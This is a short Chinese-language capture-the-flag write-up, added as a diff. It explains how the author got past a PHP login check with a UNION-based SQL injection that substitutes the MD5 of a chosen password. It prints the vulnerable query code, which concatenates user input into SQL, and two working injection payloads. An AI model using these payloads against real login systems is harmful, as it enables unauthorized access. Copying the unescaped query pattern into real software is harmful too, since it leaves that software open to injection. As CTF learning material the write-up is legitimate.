@@ -1,0 +1,41 @@
+ 这道题还是卡了几个小时，
+
+最后的playload：
+
+user=1 union select concat('bcbe3365e6ac95ea2c0343a2395834dd')%23 &pass=222
+
+
+开始我以为注入，最后注入出来发现pw字段是111
+
+于是尝试了 弱类型 ，发现没什么软用
+
+最后想到union查询
+
+SELECT username FROM admin where id =-1 union select concat('bcbe3365e6ac95ea2c0343a2395834dd')
+
+原理：当没有id为-1的用户时 就会显示union后的语句 也就是 bcbe3365e6ac95ea2c0343a2395834dd
+
+222的md5 
+
+同时提交pass=222 就金光一闪了 
+
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+
+$sql = "select pw from php where user='$user'";        《------ 此处可以控制结果集通过union子句拼凑自己的结果集
+$query = mysql_query($sql);
+if (!$query) {
+	printf("Error: %s\n", mysql_error($conn));
+	exit();
+}
+$row = mysql_fetch_array($query, MYSQL_ASSOC);
+//echo $row["pw"];
+  
+  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {   《----只要控制子句结果集一直即可
+	echo "<p>Logged in! Key:************** </p>";
+}
+
+
+user=111' union select md5('123456') from dual where '1'='1 &pass=123456
